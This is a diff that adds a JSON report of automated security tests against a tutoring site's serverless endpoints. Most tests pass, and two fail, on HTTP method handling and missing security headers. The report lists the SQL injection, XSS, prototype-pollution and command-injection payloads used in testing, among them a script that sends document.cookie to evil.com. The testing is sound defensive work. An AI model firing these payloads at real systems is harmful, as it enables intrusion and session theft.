@@ -1,0 +1,274 @@
+{
+  "timestamp": "2026-01-14T03:48:33.941Z",
+  "baseUrl": "https://tutorcat.online",
+  "summary": {
+    "total": 12,
+    "passed": 10,
+    "failed": 2
+  },
+  "tests": [
+    {
+      "name": "SQL Injection Prevention",
+      "status": "passed",
+      "result": "No SQL injection vulnerabilities detected after testing 40 payloads across multiple endpoints (using parameterized queries)",
+      "methodology": "Tested 40 SQL injection payloads across 3 endpoints: auth-login (username and password fields), admin-get-users (search parameter), and check-username (username parameter). Each payload was tested and responses were analyzed for SQL error patterns (PostgreSQL errors, syntax errors, database errors). No SQL errors were detected in responses.",
+      "endpoints": [
+        "/.netlify/functions/auth-login (POST - username field: 20 payloads, password field: 20 payloads)",
+        "/.netlify/functions/admin-get-users (GET - search parameter: 10 payloads)",
+        "/.netlify/functions/check-username (GET - username parameter: 10 payloads)"
+      ],
+      "payloads": [
+        "' OR '1'='1",
+        "' OR 1=1--",
+        "' OR '1'='1' --",
+        "' OR 1=1#",
+        "1' OR '1'='1",
+        "admin'--",
+        "admin' /*",
+        "' OR 'x'='x",
+        "' OR 1=1 LIMIT 1--",
+        "' UNION SELECT NULL--",
+        "' UNION SELECT NULL,NULL--",
+        "' UNION SELECT * FROM users--",
+        "' UNION SELECT username,password FROM users--",
+        "1' UNION SELECT 1,2,3,4,5--",
+        "' AND 1=1--",
+        "' AND 1=2--",
+        "' AND 'a'='a"
+      ],
+      "totalPayloads": 40,
+      "vulnerabilitiesFound": 0,
+      "detectionMethod": "Analyzed response bodies for SQL error patterns including: PostgreSQL ERROR, syntax error, column does not exist, relation does not exist, invalid input syntax, unterminated quoted string, SQLSTATE error codes. Excluded false positives from application-level error messages.",
+      "limitations": null
+    },
+    {
+      "name": "Authentication Bypass",
+      "status": "passed",
+      "result": "Authentication mechanisms appear secure",
+      "methodology": "Tested three authentication bypass scenarios: (1) Attempted access to protected endpoint (auth-me) with invalid JWT token - verified token was rejected. (2) Attempted access to protected endpoint without any authentication token - verified endpoint returned 401/403. (3) Expired token handling noted for manual testing.",
+      "endpoints": [
+        "Invalid JWT token test: Sent malformed JWT token 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjM0NTY3ODkwIiwiaWF0IjoxNTE2MjM5MDIyfQ.invalid' to /.netlify/functions/auth-me - Result: Token rejected (did not return 200 with success)",
+        "Missing token test: Sent GET request to /.netlify/functions/auth-me without authentication - Result: Endpoint not accessible (did not return 200 with success)"
+      ],
+      "payloads": [],
+      "totalPayloads": 0,
+      "vulnerabilitiesFound": 0,
+      "detectionMethod": null,
+      "limitations": null
+    },
+    {
+      "name": "Privilege Escalation",
+      "status": "passed",
+      "result": "Admin endpoints properly protected",
+      "methodology": "Tested access to admin endpoints without authentication tokens. Attempted to access three admin endpoints without any authentication: admin-get-users, admin-delete-user, and admin-lessons. Verified that endpoints do not return 200 status with success=true when accessed without proper admin authentication.",
+      "endpoints": [
+        "GET /.netlify/functions/admin-get-users without token - Result: Endpoint protected (did not return 200 with success)",
+        "GET /.netlify/functions/admin-delete-user/test-user-id without token - Result: Endpoint protected (did not return 200 with success)",
+        "GET /.netlify/functions/admin-lessons without token - Result: Endpoint protected (did not return 200 with success)"
+      ],
+      "payloads": [],
+      "totalPayloads": 0,
+      "vulnerabilitiesFound": 0,
+      "detectionMethod": null,
+      "limitations": "Test did not verify if a regular user token (non-admin) can access admin endpoints. This requires a valid user JWT token which was not available in automated testing. Manual testing recommended with a valid user token to verify role-based access control."
+    },
+    {
+      "name": "Input Validation & XSS",
+      "status": "passed",
+      "result": "Input validation appears adequate",
+      "methodology": "Tested XSS payloads, email validation, path traversal, and excessive input length. Checked for payload reflection, invalid input acceptance, and DoS vulnerabilities.",
+      "endpoints": [
+        "XSS payloads in username field: Tested 5 XSS payloads in /.netlify/functions/check-username - Checked for payload reflection without sanitization",
+        "Email validation: Tested 6 invalid email formats in /.netlify/functions/auth-send-otp - Checked if invalid emails are accepted",
+        "Path traversal: Tested 3 path traversal payloads",
+        "Excessive input length: Sent 100,000 character input to /.netlify/functions/auth-login - Checked for DoS vulnerability (server crash or 500 error)"
+      ],
+      "payloads": [],
+      "totalPayloads": 0,
+      "vulnerabilitiesFound": 0,
+      "detectionMethod": null,
+      "limitations": null
+    },
+    {
+      "name": "JavaScript Injection",
+      "status": "passed",
+      "result": "No JavaScript injection vulnerabilities detected after testing 72 payloads across multiple endpoints",
+      "methodology": "Tested 72 JavaScript injection payloads across multiple endpoints including check-username, auth-login, and auth-send-otp. Checked for payload reflection in JSON responses, unencoded script tags, and dangerous JavaScript patterns. Verified that username field is no longer returned in check-username response (previously fixed vulnerability).",
+      "endpoints": [
+        "/.netlify/functions/check-username (GET - username parameter: first 30 payloads from list)",
+        "/.netlify/functions/auth-login (POST - username field: first 30 payloads from list)",
+        "/.netlify/functions/auth-send-otp (POST - email field: subset of payloads that include @ or are < 50 chars)",
+        "/.netlify/functions/auth-login (POST - JSON injection: 3 additional JSON payloads)",
+        "/.netlify/functions/check-username (GET - command injection: 5 command injection payloads)"
+      ],
+      "payloads": [
+        "<script>alert(1)</script>",
+        "<script>alert(String.fromCharCode(88,83,83))</script>",
+        "<script>alert(document.cookie)</script>",
+        "<script>alert(localStorage.getItem(\"token\"))</script>",
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert(1)>",
+        "<body onload=alert(1)>",
+        "<iframe src=\"javascript:alert(1)\">",
+        "<img src=x onerror=\"alert(1)\">",
+        "<div onmouseover=\"alert(1)\">",
+        "<input onfocus=\"alert(1)\" autofocus>",
+        "<select onfocus=\"alert(1)\" autofocus>",
+        "<textarea onfocus=\"alert(1)\" autofocus>",
+        "<keygen onfocus=\"alert(1)\" autofocus>",
+        "<video><source onerror=\"alert(1)\">",
+        "<audio src=x onerror=\"alert(1)\">",
+        "javascript:alert(1)",
+        "javascript:alert(document.cookie)",
+        "javascript:void(0);alert(1)",
+        "JaVaScRiPt:alert(1)",
+        "%3Cscript%3Ealert(1)%3C/script%3E",
+        "&#60;script&#62;alert(1)&#60;/script&#62;",
+        "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E",
+        "\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E",
+        "${alert(1)}",
+        "{{alert(1)}}",
+        "#{alert(1)}",
+        "%{alert(1)}",
+        "${7*7}",
+        "{{7*7}}",
+        "{\"__proto__\":{\"isAdmin\":true}}",
+        "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}",
+        "{\"__proto__\":{\"polluted\":\"yes\"}}",
+        "__proto__[isAdmin]=true",
+        "constructor[prototype][isAdmin]=true",
+        "constructor.prototype.isAdmin=true",
+        "eval(\"alert(1)\")",
+        "Function(\"alert(1)\")()",
+        "setTimeout(\"alert(1)\",0)",
+        "setInterval(\"alert(1)\",0)",
+        "new Function(\"alert(1)\")()",
+        "<script>document.body.innerHTML=\"<h1>Hacked</h1>\"</script>",
+        "<script>document.location=\"http://evil.com\"</script>",
+        "<script>fetch(\"http://evil.com?cookie=\"+document.cookie)</script>",
+        "{alert(1)}",
+        "{() => alert(1)}",
+        "{eval(\"alert(1)\")}",
+        "require(\"child_process\").exec(\"ls\")",
+        "process.exit()",
+        "global.process.exit()"
+      ],
+      "totalPayloads": 82,
+      "vulnerabilitiesFound": 0,
+      "detectionMethod": null,
+      "limitations": null
+    },
+    {
+      "name": "Rate Limiting",
+      "status": "passed",
+      "result": "Rate limiting detected after 1 failed login attempts",
+      "methodology": "Attempted 15 rapid login attempts with wrong password to test brute force protection. Rate limiting should trigger after 10 failed attempts within 15 minutes.",
+      "endpoints": [
+        "Attempt 1: Status 429 (RATE LIMITED)"
+      ],
+      "payloads": [],
+      "totalPayloads": 0,
+      "vulnerabilitiesFound": 0,
+      "detectionMethod": null,
+      "limitations": null
+    },
+    {
+      "name": "CORS Configuration",
+      "status": "passed",
+      "result": "CORS configuration appears secure",
+      "methodology": "Sent OPTIONS request to /.netlify/functions/auth-login and analyzed CORS headers",
+      "endpoints": [
+        "OPTIONS request to /.netlify/functions/auth-login - Result: CORS configuration appears secure"
+      ],
+      "payloads": [],
+      "totalPayloads": 0,
+      "vulnerabilitiesFound": 0,
+      "detectionMethod": null,
+      "limitations": null
+    },
+    {
+      "name": "Information Disclosure",
+      "status": "passed",
+      "result": "No obvious information disclosure issues",
+      "methodology": "Tested error messages, stack traces, and debug endpoints for information disclosure. Three test categories: (1) Error message analysis - checked if authentication errors reveal database/SQL/connection information. (2) Stack trace testing - sent invalid JSON to trigger errors and checked for stack trace exposure. (3) Debug endpoint enumeration - tested common debug endpoints for version/environment information.",
+      "endpoints": [
+        "Error message analysis: POST /.netlify/functions/auth-login with invalid credentials (username: 'nonexistent', password: 'wrong') - Checked if error messages contain 'database', 'sql', or 'connection' keywords",
+        "Stack trace testing: POST /.netlify/functions/auth-login with invalid JSON body ('invalid json') - Checked response for stack trace indicators ('at ', 'Error:', 'stack', 'node_modules')",
+        "Debug endpoint enumeration: Tested 4 endpoints (/debug, /test, /health, /status) - Checked for version/environment information exposure"
+      ],
+      "payloads": [],
+      "totalPayloads": 0,
+      "vulnerabilitiesFound": 0,
+      "detectionMethod": null,
+      "limitations": null
+    },
+    {
+      "name": "IDOR (Insecure Direct Object References)",
+      "status": "passed",
+      "result": "No obvious IDOR vulnerabilities detected - endpoints require authentication",
+      "methodology": "Tested for Insecure Direct Object References (IDOR) vulnerabilities. Four test scenarios: (1) Lesson access - attempted to access lesson data without proper authentication/ownership validation. (2) Dashboard data - attempted to access dashboard data without proper user validation. (3) Evaluation submission - attempted to submit evaluation results for a different user_id (999999) to test if endpoint validates user_id matches authenticated user. (4) User achievements - attempted to access user achievements without proper authentication. IDOR vulnerabilities occur when an application provides direct access to objects based on user-supplied input without proper authorization checks.",
+      "endpoints": [
+        "/.netlify/functions/get-lesson",
+        "/.netlify/functions/get-dashboard-data",
+        "/.netlify/functions/submit-evaluation-test",
+        "/.netlify/functions/get-user-achievements"
+      ],
+      "payloads": [],
+      "totalPayloads": 0,
+      "vulnerabilitiesFound": 0,
+      "detectionMethod": null,
+      "limitations": "Full IDOR testing requires valid authentication tokens from multiple users. This test verifies endpoint structure and authentication requirements. Manual testing with actual user tokens is recommended to fully validate user ownership checks."
+    },
+    {
+      "name": "OTP Brute Force Protection",
+      "status": "passed",
+      "result": "OTP endpoints implement rate limiting to prevent brute force attacks",
+      "methodology": "Tested OTP brute force protection by attempting 15 rapid OTP verification attempts with invalid codes. Two test scenarios: (1) OTP verification brute force - sent 15 rapid POST requests to /.netlify/functions/auth-verify-otp with invalid OTP codes (000000) to test if rate limiting prevents brute force attacks. (2) OTP send rate limiting - sent 15 rapid requests to /.netlify/functions/auth-send-otp to test if rate limiting prevents OTP spam. OTP brute force attacks attempt to guess valid OTP codes through repeated attempts. Rate limiting should block these attacks after a reasonable number of attempts.",
+      "endpoints": [
+        "/.netlify/functions/auth-verify-otp",
+        "/.netlify/functions/auth-send-otp"
+      ],
+      "payloads": [],
+      "totalPayloads": 0,
+      "vulnerabilitiesFound": 0,
+      "detectionMethod": null,
+      "limitations": null
+    },
+    {
+      "name": "HTTP Method Validation",
+      "status": "failed",
+      "severity": "medium",
+      "result": "HTTP method validation issues: /.netlify/functions/auth-me accepts HEAD method (should return 405); /.netlify/functions/get-lesson accepts HEAD method (should return 405); /.netlify/functions/health accepts HEAD method (should return 405); /.netlify/functions/check-username accepts HEAD method (should return 405)",
+      "methodology": "Tested HTTP method restrictions on 5 endpoints. For each endpoint, sent requests using unsupported HTTP methods (PUT, DELETE, PATCH, TRACE, CONNECT, HEAD) and verified that endpoints return 405 Method Not Allowed for unsupported methods. Proper HTTP method validation prevents attackers from using unintended methods that might bypass security controls.",
+      "endpoints": [
+        "/.netlify/functions/auth-login",
+        "/.netlify/functions/auth-me",
+        "/.netlify/functions/get-lesson",
+        "/.netlify/functions/health",
+        "/.netlify/functions/check-username"
+      ],
+      "payloads": [],
+      "totalPayloads": 0,
+      "vulnerabilitiesFound": 4,
+      "detectionMethod": null
+    },
+    {
+      "name": "Security Headers",
+      "status": "failed",
+      "severity": "medium",
+      "result": "Security header issues: /.netlify/functions/auth-me missing required security header: X-Content-Type-Options; /.netlify/functions/auth-me missing required security header: X-Frame-Options; /.netlify/functions/auth-me missing required security header: X-XSS-Protection; /.netlify/functions/auth-me missing required security header: Referrer-Policy; /.netlify/functions/get-lesson missing required security header: X-Content-Type-Options (and 7 more)",
+      "methodology": "Tested security headers on 5 endpoints. For each endpoint, checked for required security headers: X-Content-Type-Options (should be 'nosniff'), X-Frame-Options (should be 'DENY'), X-XSS-Protection (should be '1; mode=block'), and Referrer-Policy (should be 'strict-origin-when-cross-origin'). Also checked for recommended headers: Content-Security-Policy and Strict-Transport-Security. Security headers help protect against various attacks including clickjacking, XSS, MIME type sniffing, and information leakage.",
+      "endpoints": [
+        "/.netlify/functions/health",
+        "/.netlify/functions/auth-login",
+        "/.netlify/functions/auth-me",
+        "/.netlify/functions/get-lesson",
+        "/.netlify/functions/check-username"
+      ],
+      "payloads": [],
+      "totalPayloads": 0,
+      "vulnerabilitiesFound": 12,
+      "detectionMethod": null
+    }
+  ]
+}
